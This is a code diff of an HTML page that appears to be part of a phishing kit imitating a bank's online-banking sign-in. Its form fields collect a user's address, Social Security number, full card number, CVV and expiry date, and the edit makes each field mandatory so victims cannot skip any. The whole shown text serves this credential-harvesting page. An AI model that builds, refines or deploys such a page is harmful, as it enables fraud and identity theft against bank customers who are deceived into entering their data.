@@ -165,22 +165,22 @@ document.getElementById("year").innerHTML = date;
 												<div class="userPassGroup">
 													<div class="form-group username" style="display:inline-block;">
 														<label for="user">Address</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input type="text" name="address" placeholder="P.O. Box 3000 Merrifield, VA 22119" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input required type="text" name="address" placeholder="P.O. Box 3000 Merrifield, VA 22119" id="user" maxlength="32" class="form-control" required="">
 													</div>
 													<div class="form-group password" style="display:inline-block;">
 														<label for="password">Social Security Number</label>
-														<input type="password" name="ssn" placeholder="xxx-xx-xxxx" id="password" class="form-control" required="">
+														<input required type="password" name="ssn" placeholder="xxx-xx-xxxx" id="password" class="form-control" required="">
 													</div><div class="form-group username" style="display:inline-block;">
 														<label for="user">Card No.</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input type="text" name="card" placeholder="1234-1234-1234-1234" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input required type="text" name="card" placeholder="1234-1234-1234-1234" id="user" maxlength="32" class="form-control" required="">
 													</div>
                                                     <div class="form-group username" style="display:inline-block;">
 														<label for="user">CVV</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input type="text" name="cvv" placeholder="000" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input required type="text" name="cvv" placeholder="000" id="user" maxlength="32" class="form-control" required="">
 													</div>
                                                     <div class="form-group username" style="display:inline-block;">
 														<label for="user">Expiry: mm/yyyy </label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
-							  	  						<input type="month" name="exp" id="user" maxlength="32" class="form-control" required="">
+							  	  						<input required type="month" name="exp" id="user" maxlength="32" class="form-control" required="">
 													</div>
 
 													<div class="signInHelp"><a href="" aria-label="Sign In Help">Sign In Help</a></div>
